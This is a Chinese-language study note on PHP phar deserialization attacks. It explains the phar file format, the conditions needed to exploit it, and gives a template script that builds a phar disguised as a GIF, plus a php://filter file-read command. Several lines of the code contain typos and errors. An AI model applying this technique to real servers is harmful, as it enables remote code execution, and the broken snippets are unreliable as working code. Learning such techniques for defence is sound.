Phar 是一种归档，也就是类似于一个压缩包。用于打包多个 PHP 文件及其依赖项。PHAR 文件具有许多优点，如易于分发、易于更新和维护。

phar是一种类似于jar的打包文件，但是实际上是一种压缩文件，php5.3版本或以上都默认开启，可以将多个文件压缩成一个phar文件，phar不需要依赖unserialize函数就可以进行反序列化操作，使用phar伪协议读取文件会将文件中的meta-data数据进行一次反序列化操作。同时php中已经内置了一个phar类用于处理相关的操作


## 文件格式：
- a stub
可以理解成标识，必须以**`__HALT_COMPILER();?>`** 结尾，否则不会被识别为phar文件，结尾前的内容不限，比如可以是：`**xxx\<?php xxx;__HALT_COMPILER();?>**`  
  

- a manifest describing the contents
phar 文件中本质上是一个压缩文件，所以这一部分会放一些压缩文件的一些信息，其中 meta-data 就是以序列化的形式存储在这里，这个也是漏洞执行的关键点。也就是说，我们的 meta-data 会是一个**序列化的字符串**。 
  
- the file contents
被压缩的文件内容，在没有特殊要求的情况下，可以随便写，反正最终我们只是需要序列化出我们想要得到内容就行了

## 利用漏洞：
我们想要利用我们的漏洞，我们就需要把我们的 Meta-data 部分写成一个字符串，那么之后，我们就可以把我们的这一个字符串给进行反序列化。那么：**如果我们用 phar 协议访问我们的 phar 文件，我们就会把我们的 Meta-data 来进行反序列化。**

## 使用条件：
1. 需要用可用的类，类中由魔术方法，最后通过 pop chain 调用到危险的方法
2. 需要文件操作函数去除法 `phar://` 的 stream
3. 有上传或者写文件的操作，可以把无损 phar 文件写入 web 服务器，后缀名任意。
4. Php. Ini 中把我们的 phar. Readonly 关闭

触发函数：
![[Pasted image 20240418104624.png]]
## 使用模板：

1. 把 class 定义的代码拆下来，把方法注释
2. 构造 pop 链
3. 帖 phar 八股文

```php
 //生成phar文件
<?php
class AnyClass{
    var $output = '';
    function __construct(){
        echo '生成完成...';
    }
}

/*phar八股文*/

$phar = new Phar('phar.phar');  //被生成的文件，必须是phar做为后缀名
$phar -> stopBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>'); 
$phar->setMetadata($o)//这里的o是我们之前的类
$phar -> addFromString('vfree.txt','vfree'); 
$phar -> stopBuffering();
```

## 文件内容转换：
1. 文件内容转换为 base64 编码
```
php -a;
echo file_get_content("php://filter/covert.base64-encode/resourse=phar.phar");
```

